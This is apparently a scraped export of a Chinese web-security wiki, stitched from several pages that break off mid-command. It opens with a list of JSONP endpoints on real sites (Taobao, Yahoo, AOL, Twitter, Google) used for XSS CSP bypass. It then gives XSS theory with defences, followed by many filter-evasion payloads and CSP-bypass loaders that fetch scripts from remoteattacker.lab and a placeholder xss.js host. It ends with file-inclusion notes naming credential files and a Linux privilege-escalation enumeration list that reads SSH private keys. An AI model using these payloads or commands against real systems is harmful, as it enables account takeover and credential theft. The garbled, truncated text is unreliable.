script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com “script+src”https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain); AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script"},{"path":"/wiki/Web知识点/xss/xss绕过.html","content":"XSS绕过总结一、分类反射性XSS存储型XSSDOM型XSS 反射型xss 攻击方式 攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 攻击步骤 1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 防御反射型攻击 1.对输入检查对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。2.对输出进行转义再显示通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。 存储型xss 攻击方式 攻击者在发帖、留言、评论的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 攻击步骤 1.攻击者将恶意代码提交到目标网站的数据库中。2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。 预防存储型XSS攻击 预防存储型XSS攻击也是从输入和输出两个方面来考虑。1.服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;2.前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与输出点，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。 DOM型xss 攻击方式 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。/*DOM(Document object model)，使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的，不需要与服务器进行交互。*/ 攻击步骤 1.攻击者构造出特殊数据，其中包含恶意代码。2.用户浏览器执行了恶意代码3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作./*DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.*/ 其他防范策略 HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作 在服务端使用HTTP的Content-Security-Policy头部来指定策略，或者在前端设置meta标答。例如只允许加载同域下的资源 应对XSS攻击的主要手段还是编码与过滤两种，编码用于将特殊的符号 “、、、’、””进行html转义，而过滤则是阻止特定的标记、属性、事件。 二、攻击荷载alert font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt(1)/font 会弹输入框，点确定即算执行 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm(1)/font 弹确定取消框 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open(javascript:alert(1))/font 既弹窗又能加载伪协议 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print()/font 调出打印对话框（部分浏览器） script标签script 标签用于定义客户端脚本scriptalert(xss)/script scriptalert(/xss/)/script scriptalert(document.cookie)/script script src=http://xxx.com/xss.js/script svg标签svg 标签用来在HTML页面中直接嵌入SVG 文件的代码。 // 等价于 svg onload=alert(xss)svg onload=alert(xss)// img标签img 标签定义 HTML 页面中的图像img src=1 onerror=alert(xss)img src=1 onerror=alert(document.cookie)img src=1 onerror=eval(alert(xss))img src=javascript:alert(xss)img src=javascript:alert(String.formCharCode(88,83,83))img src=1 onmouseover=alert(xss) body标签body 标签定义文档的主体。body onload=alert(xss)body onpageshow=alert(xss) video标签video 标签定义视频，比如电影片段或其他视频流。videosource onerror=alert(1)videosource onerror=alert(xss);/videovideo controls onmouseover=alert(xss);/videovideo controls onfocus=alert(xss); autofocus=/videovideo controls onclick=alert(xss);/video style标签style 标签定义 HTML 文档的样式信息。style onload=alert(1)/style input标签input标签规定了用户可以在其中输入数据的输入字段。点击输入框触发input onfocus=alert(1);input value= onclick=alert(xss) type=textinput name=name value=onmouseover=prompt(xss) bad=input name=name value=scriptalert(xss)/scriptinput onblur=alert(1) autofocusinput autofocusinput onfocus=alert(1); autofocus details 标签details 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。details ontoggle=alert(1);details open ontoggle=alert(1); select 标签select 标签用来创建下拉列表。select onfocus=alert(1)/selectselect onfocus=alert(1) autofocus iframe 标签iframe 标签会创建包含另外一个文档的内联框架 iframe onload=alert(1);/iframe audio 标签audio 标签定义声音，比如音乐或其他音频流。audio src=x onerror=alert(1); textarea 标签`textarea` 标签定义一个多行的文本输入控件。textarea onfocus=alert(1); autofocus marquee 标签marquee onstart=alert(1)/marquee //Chrome不行，火狐和IE都可以 isindex 标签isindex type=image src=1 onerror=alert(1)//仅限于IE link 标签link 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用： link rel=import href=http://47.xxx.xxx.72/evil.js a 标签a href=javascript:alert(1);xss/aa href=x onclick=eval(alert(xss);)xss/aa href=x onmouseover=alert(xss);xss/aa href=x onmouseout=alert(xss);xss/a form标签form action=Javascript:alert(1)input type=submitform method=x action=x onmouseover=alert(xss);input type=submit/form button标签button onclick=alert(1)button onfocus=alert(xss); autofocus=xss/buttonbutton onclick=alert(xss);xss/buttonbutton onmouseover=alert(xss);xss/buttonbutton onmouseout=alert(xss);xss/buttonbutton onmouseup=alert(xss);xss/buttonbutton onmousedown=alert(xss);/button div标签这个需要借助url编码来实现绕过原代码：div onmouseover=alert(1)DIV/div经过url编码：div onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv object标签这个需要借助 data 伪协议和 base64 编码来实现绕过object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object p标签p onclick=alert(xss);xss/pp onmouseover=alert(xss);xss/pp onmouseout=alert(xss);xss/pp onmouseup=alert(xss);xss/p 三、绕过思路过滤 危险字符 “ ‘ 绕过空格过滤当空格被过滤了时，我们可以用 / 来代替空格： img/src=x/onerror=alert(1); 空格回车Tab绕过主要和正则对抗空格：img src= javascript:alert(9527); TAB： img src= javasc :ript:alert(9528); 回车： img src= javascript:alert(xss); 绕过引号过滤如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号： img src=x onerror=alert(`xss`); 绕过括号过滤当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。 img src=x onerror=javascript:window.onerror=alert;throw 1a onmouseover=javascript:window.onerror=alert;throw 1 绕过关键字过滤大小写绕过sCRiPtalert(1);/sCrIpTImG sRc=x onerRor=alert(1); 双写绕过有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过 scrscriptiptalert(1);/scrscriptiptimimgg srsrcc=x onerror=alert(1); 字符串拼接绕过利用eval()函数 与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。 img src=x onerror=a=aler;b=t;c=(1);eval(a+b+c)img src=x onerror=a=`aler`;b=`t`;c=(`xss`);;eval(a+b+c)!--在js中，我们可以用反引号代替单双引号-- 利用top scripttop[al+ert](`xss`);/scriptscripttop[al+ert](xss);/script 拆分法当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过 scripta=document.write(/scriptscripta=a+script src=ht/scriptscripta=a+tp://note163.com/xs/scriptscripta=a+s.js/script)/scriptscripteval(a)/script/*document.write(script src = http://note163.com/xss.js/script)*/ 上传文件构造xss上传普通文件更改文件名为xss语句 .gifpng 编码绕过浏览器整个解析顺序为3个环节：HTML实体解码 —URL解码 —JS解码（只支持Unicode） HTML 实体编码 我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 # 开头以分号 ; 结尾（也可以不带分号）。 !--a href=javascript:alert(xss)test\\/a--!--十进制--a href=#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41;test/a !--十六进制--a href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a !--也可以不带分号--a href=#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29test/a!--img src=x onerror=alert(xss)--!--十进制--img src=x onerror=#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41; !--十六进制--img src=x onerror=#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29; !--也可以不带分号--img src=x onerror=#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29 HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 #… 形式解码，转化成对应的解码字符并被放入数据缓冲区中。 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 符号（后面没有跟 符号）就会进入 标签开始状态(Tag open state) ，然后转变到 标签名状态(Tag name state) 、 前属性名状态(before attribute name state) ……最后进入 数据状态(Data state) 并释放当前标签的token。当解析器处于数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。 **数据状态中的字符引用：**数据状态就是解析一个标签内里面的内容，如 div.../div 中的内容，当浏览器解析完 div 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了 **属性值状态中的字符引用：**属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的。 RCDATA状态中的字符引用：然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素： 空元素(Void elements)，如 area、br、base 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。 原始文本元素(Raw text elements)，有 script 和 style。原始文本元素可以容纳文本。 RCDATA元素(RCDATA elements)，有 textarea 和 title。RCDATA元素可以容纳文本和字符引用。 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。 基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。 注意到RCDATA元素中有 textarea 和 title 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以HTML编码的XSS语句触发不了XSS。 HTML的五类元素中，像 script、style 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符,不会触发语句原有的结果。但是当在前面加上 svg ，即可成功弹窗。 URL编码我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。 a href=javascript:alert(xss)test/aa href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29test/aiframe src=javascript:alert(xss)/iframeiframe src=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29/iframe!--伪协议头 javascript: 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。如：http://www.baidu.com 可以被URL编码为 http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d，但是不能把协议也进URL编码：%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d但是伪协议头 javascript: 可以进行HTML编码。-- Javascript 编码我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 script、style 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。Javascript 中可以识别的编码类型有： Unicode 编码 八进制编码 十六进制编码 Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。 Unicode 编码scriptalert(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)/scripta href=javascript:alert(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)test/a!--不能对伪协议头 javascript: 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。-- 在DOM环境中的JavaScript编码对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，要想让他们能够执行我们要将他们放在DOM环境中scriptalert(xss)/scriptscript\\141\\154\\145\\162\\164(xss)/scripta href=javascript:alert(xss)test/aa href=javascript:\\x61\\x6c\\x65\\x72\\x74(xss)test/a!--如果过滤了 、、、、、% 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS语句全部编码--即 iframe src=javascript:alert(xss)/iframe 的以下编码都可以弹窗：!--Unicode编码--\\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E!--八进制编码--\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76!--十六进制编码--\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e 另一种弹窗的方法scriptalert(xss)/scriptscripteval(\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51)/scripta href=javascript:alert(xss)test/aa href=javascript:eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29)test/aimg src=x onerror=alert(xss)img src=x onerror=eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29) 混合编码a href=javascript:alert(xss)test/a首先对“alert”进行JavaScript Unicode编码：a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/a然后再对 \\u0061\\u006c\\u0065\\u0072\\u0074 进行URL编码：a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(xss)test/a最后对标签中的 javascript:%5c%75...%37%34(xss) 整体进行HTML编码即可： svga href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x31;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x36;#x33;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x35;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x32;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x34;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a 四、CSP绕过1.jsonp绕过要求： CSP：font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self https://www.google.com https://www.youtube.com; object-src none;/font 2.绕过 CSP 默认源要求： CSP 类似font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);Content-Security-Policy: default-src self unsafe-inline;/font， 有效载荷： font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);http://example.lab/csp.php?xss=f=document.createElement%28iframe%29;f.id=pwn;f.src=/robots.txt;f.onload=%28%29=%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;/font script=document.createElement(script);script.src=//remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 3.绕过 CSP 在线评估(iframe被禁止)要求： CSP或 CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);inline/font或font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);eval/font 有效载荷： ddocument;fd.createElement(“iframe”);f.srcd.querySelector(‘link[href*”.css”]’).href;d.body.append(f);sd.createElement(“script”);s.src”https:[YOUR_XSSHUNTER_USERNAME].xss.ht”;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) 4.绕过 CSP 脚本源自身要求： 类似 CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self/font 有效载荷： 5.绕过 CSP 脚本源数据要求： CSP 就像Mozillafont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self data:/font官方文档中警告的那样。 有效载荷： /"},{"path":"/wiki/Web知识点/工具指南/kali操作.html","content":"kali操作 切换rootsudo passwd rootssh连接ssh_configP有关的sshd_config两个P有关的 更新源sudo vim etcaptsources.listdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib更新 apt-get update apt-get upgradeapt-get dist-upgradeapt-get clean 安装vim"},{"path":"/wiki/Web知识点/xxe漏洞/xxe漏洞.html","content":"xxe漏洞"},{"path":"/wiki/Web知识点/文件上传/文件上传.html","content":"文件上传 http:目标网站include.php?fileuploadmerged.gif 文件头对照表： 类型 魔数（Hex） ASCII 表现 GIF 47 49 46 38 GIF89a JPEG FF D8 ÿØ PNG 89 50 4E 47 ‰PNG"},{"path":"/wiki/Web知识点/文件下载/文件下载.html","content":"检测参数值后接上是否为文件或文件链接read.xxx?filenamedown.xxx?filenamereadfile.xxx?filedownfile.xxx?file.. ..\\ . .等%00 ? %23 %20 .等readpath、filepath、path、inputpath、url、data、readfile、menu、META-INF、WEB-INF、"},{"path":"/wiki/Web知识点/文件包含/文件包含.html","content":"文件包含 函数include conn.php: 当包含文件出现错误时，发出错误信息，继续执行 include_once conn.php：只包含一次 require conn.php： 当包含出现错误时，发出错误信息，不再执行 require_once conn.php：只包含一次 本地包含本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。文件包含漏洞还包含当前服务器中的其他文件，同时支持包含Web应用程序的目录，尝试包括你的硬盘的一些内容，例如：C:\\WINDOWS\\system.ini。 php伪协议php://php://input+post数据php://filter/read=convert.base64-encode/resource=index.phpdata://text/plain,?php%20phpinfo();? 远程包含.allow_url_fopen On allow_url_include On 可以在服务器上制作以恶搞恶意文件，通过http或https进行上传，即可达到远程控制 常见的敏感信息路径：Windows系统 c:\\boot.ini 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS配置文件 c:\\windows\\repair\\sam 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD MySQL root密码 c:\\windows\\php.ini php 配置信息 LinuxUnix系统 etcpasswd 账户信息 etcshadow 账户密码文件 usrlocalappapache2confhttpd.conf Apache2默认配置文件 usrlocalappapache2confextrahttpd-vhost.conf 虚拟网站配置 usrlocalappphp5libphp.ini PHP相关配置 etchttpdconfhttpd.conf Apache配置文件 etcmy.conf mysql 配置文件"},{"path":"/wiki/内网/提权/Linux提权.html","content":"基础知识信息收集操作系统| plain uname -a # 打印所有可用的系统信息 uname -r # 内核版本 uname -n # 系统主机名。 uname -m # 查看系统内核架构（64位/32位） uname -mrs # 查看系统内核架构（64位/32位） hostname # 系统主机名 cat /proc/version # 内核信息 cat /etc/*-release # 分发信息 cat /etc/issue # 分发信息 cat /proc/cpuinfo # CPU信息 cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based ls /boot | grep vmlinuz-\t# 内核版本 || — | 环境变量 plain env # 显示环境变量 set # 现实环境变量 echo %PATH # 路径信息 history # 显示当前用户的历史命令记录 pwd # 输出工作目录 cat /etc/profile # 显示默认系统变量 cat /etc/shells # 显示可用的shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ # ??表示两个符号 打印机服务 plain lpstat -a 用户和群组| plain cat /etc/passwd # 列出系统上的所有用户 cat /var/mail/root cat /var/spool/mail/root cat /etc/group # 列出系统上的所有组 grep -v -E ^# /etc/passwd | awk -F: $3 == 0 { print $1} # 列出所有的超级用户账户 whoami # 查看当前用户 w # 谁目前已登录，他们正在做什么 last # 最后登录用户的列表 lastlog # 所有用户上次登录的信息 lastlog –u %username% # 有关指定用户上次登录的信息 lastlog |grep -v Never # 以前登录用户的完整信息 || — | 用户权限信息 plain whoami 当前用户名 id 当前用户信息 cat /etc/sudoers 谁被允许以root身份执行 sudo -l 当前用户可以以root身份执行操作 进程和服务 plain ps aux ps -ef top cat /etc/services 查看以 root 运行的进程 | plain ps aux | grep root ps -ef | grep root || — | 查看安装的软件 plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l 服务插件检查有没有不安全的服务配置，和一些有漏洞的插件。 | plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk $1 ~ /^.*r.*/ || — | 计划任务| plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root || — | 有无明文存放用户密码| plain grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find , -name *.php -print0 | xargs -0 grep -i -n var $password || — | 比如说可能使用邮件明文传输密码； 又或者说 MySQL 中明文存放用户密码。 有无 ssh 私钥 plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat 